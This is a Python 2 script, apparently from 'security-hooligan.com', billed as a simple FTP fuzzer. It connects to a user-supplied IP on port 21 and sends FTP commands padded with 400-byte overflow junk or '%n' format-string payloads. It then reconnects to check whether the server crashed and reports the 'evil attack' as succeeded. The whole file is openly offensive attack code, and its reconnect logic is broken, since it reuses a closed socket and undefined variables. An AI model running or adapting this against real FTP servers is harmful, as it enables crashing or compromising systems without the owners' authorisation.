#security-hooligan.com
#simple simple very simple ftp fuzzer v1
import socket
import sys
from time import sleep

#themelimi i konfiguracionit
class config():
    def __init__(self,configuration):
        self.configuration = configuration
    def pconf(self):
        for conf,dt in self.configuration.items():
            print conf,dt
#socket setting up (1)
class Socket_Attack_CloseCheck():
    def __init__(self):
        global s 
        s = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
    def connect(self):
        host = raw_input("> ip   : ")
        port = 21
        try:
            print "[*] Connecting to the target .."
            sleep(1)
            s.connect((host,port))
            print "[*] Connecting successful "
        except:
            print "[-] Error occured while connecting .."
            sys.exit(0)
#seting up the attack
#class Attack():
    def _Attack_(self):
        user_send=raw_input("> anonymous user and password : Y/N")
        if user_send == "Y":
            s.send("USER anonymous\r\n")
            s.recv(1024)
            s.send("PASS anonymous\r\n")
            s.recv(1024)
            pass
        elif user_send == "N":
            pass
        #our evil packs for the attack
        attack_scenario = {
          'ch_junk'       : "\x41" * 400, #change if u want to
          'format_string' : "%n" * 400 # ndrro nese don :) its up to you & nevojes
        }
        i=0
        for attack in attack_scenario:
            i=i+1
            print i,"%s" % (attack)
        chooce = raw_input("> ")
        commandat = {
          'ABOR' : 'abort a file transfer',
          'CWD' : 'change working directory',
          'DELE' : 'delete a remote file',
          'LIST' : 'list remote files',
          'MDTM' : 'return the modification time of a file',
          'MKD' : 'make a remote directory',
          'NLST' : 'name list of remote directory',
          'PASS' : 'send password',
          'PASV' : 'enter passive mode',
          'PORT' : 'open a data port',
          'PWD' : 'print working directory',
          'QUIT' : 'terminate the connection',
          'RETR' : 'retrieve a remote file',
          'RMD' : 'remove a remote directory',
          'RNFR' : 'rename from',
          'RNTO' : 'rename to',
          'SITE' : 'site-specific commands',
          'SIZE' : 'return the size of a file',
          'STOR' : 'store a file on the remote host',
          'TYPE' : 'set transfer type',
          'USER' : 'send username',
          'ACCT' : 'send account information',
          'APPE' : 'append to a remote file',
          'CDUP' : 'CWD to the parent of the current directory',
          'HELP' : 'return help on using the server',
          'MODE' : 'set transfer mode',
          'NOOP' : 'do nothing',
          'REIN' : 'reinitialize the connection',
          'STAT' : 'return server status',
          'STOU' : 'store a file uniquely',
          'STRU' : 'set file transfer structure',
          'SYST' : 'return system type'
        }
        for comm,defi in commandat.items():
            print comm,defi
        command_sent=raw_input("> Command : Y/N")
        if command_sent == "Y":
            command=raw_input("> Command : ")
            pass
        elif command_sent == "N":
            pass
        else:
            sys.exit(0)
        if "2" in chooce:
            try:
                print "[+] package size : %d " % len(attack_scenario['ch_junk'])
                print "[*] Sending our evil package"
                s.send(command + " " + attack_scenario['ch_junk'] + "\r\n")
                s.recv(1024)
                print "[*] Evil package sent."
            except:
                print "[-} Error sending the evil package."
        elif "1" in chooce:
            try:
                print "[+] package size : %d " % len(attack_scenario['format_string'])
                print "[*] Sending our evil package"
                s.send(command + attack_scenario['format_string'] + "\r\n")
                s.recv(1024)
                print "[*] Evil package sent."
                print "-" * 10
            except:
                print "[-} Error sending the evil package."

        else:
            sys.exit(0)
#Close the connection and try to connect again.
#class CloseCheck():
    def _CloseCheck_(self):
        print "[*] Closing the connection and checking if it works"
        s.close()
        print "[*] Reconnecting to the server.. "
        sleep(1)
        try:
            s.connect((host,port))
            s.recv(1024)
            print "[#] Our evil attack didnt succeed."
            print "-" * 10
        except:
            print "[*] Evil attack succeded."
#simple instructions on have to use it(even if u already know this)
class HelpMe():
    def __init__(self):
        pass
    def helping(self):
        helpme=raw_input("press any key to continue")
        _help_= {
          '> ip'             : ' Target ip',
          '>  '              : ' Chooce attack scenario',
          '> Command : Y/N'  : ' Use a command while doing the attack(overflow) Y(YES),N(NO)',
          '> Command'        : ' Command youd like to use'
        }
        a = 0
        for h1s,h2s in _help_.items():
            a=a+1
            print a,h1s,h2s

THIS_CONF       = {
  'w0t   :'   : 'bla bla bla',
  'app   :'     : 'security-hooligan.com simplest-ftp-fuzzer'
  }
do_you_need     = raw_input("Do you need help? PO(PO if yes)")
if "PO" in do_you_need:
    ndihma      = HelpMe()
    ndihma.helping()
    print "-" * 10
    pass
else:
    pass

conf            = config(THIS_CONF)
conf.pconf()
SAC             = Socket_Attack_CloseCheck()
SAC.connect()
SAC._Attack_()
SAC._CloseCheck_()
